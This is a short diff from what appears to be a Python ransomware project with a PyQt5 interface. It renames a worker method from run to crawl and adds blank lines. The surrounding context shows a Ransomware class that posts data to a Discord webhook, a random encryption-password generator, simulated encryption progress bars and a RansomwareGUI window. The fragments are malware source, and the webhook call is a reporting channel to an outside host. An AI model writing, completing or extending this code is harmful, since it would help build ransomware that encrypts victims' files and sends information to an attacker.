@@ -144,6 +144,8 @@ class Ransomware(PyQt5.QtCore.QRunnable):           # defines class that inherit
             r = requests.post(discordWebhook, json=data)
         except Exception as e:
             print(f"Error sending message to Discord webhook: {e}")
+    
+    
 
     # Generate random string for encryption password
     def rSeed(self, stringLength):
@@ -161,7 +163,7 @@ class Worker(QObject):
     progress_updated_2 = pyqtSignal(int)
     progress_updated_3 = pyqtSignal(int)
 
-    def run(self):
+    def crawl(self):
         # Simulate encryption progress for the first progress bar
         for i in range(101):
             self.progress_updated_1.emit(i)
@@ -303,7 +305,7 @@ class RansomwareGUI(QMainWindow):
         self.worker.progress_updated_3.connect(self.updateEncryptionProgress3)
 
         # Start the thread
-        self.worker_thread.started.connect(self.worker.run)
+        self.worker_thread.started.connect(self.worker.crawl)
         self.worker_thread.start()
 
     def updateEncryptionProgress1(self, value):
